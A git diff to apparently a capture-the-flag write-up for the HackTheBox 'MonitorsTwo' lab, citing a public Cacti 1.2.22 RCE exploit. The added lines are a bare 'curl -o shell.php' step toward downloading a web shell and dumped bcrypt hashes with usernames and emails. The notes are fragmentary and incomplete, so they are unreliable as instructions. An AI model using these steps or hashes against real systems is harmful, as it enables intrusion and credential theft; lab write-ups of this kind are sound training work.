@@ -32,4 +32,9 @@ We found a website that seems to use a webapp named Cacti in version 1.2.22
 <img width="749" alt="image" src="https://github.com/MaTe0r/app.hackthebock.com/assets/94843357/72dd313b-88d7-46ed-8fe0-81a25260037d">
 
 By googling, it seems there is no default credentials for the app but we found an RCE for the version 1.2.22 (https://www.exploit-db.com/exploits/51166)
+curl -o shell.php
 
+
+admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC (Jamie Thompson - admin@monitorstwo.htb)
+marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C (Marcus Brune - marcus@monitorstwo.htb)
+guest:43e9a4ab75570f5b
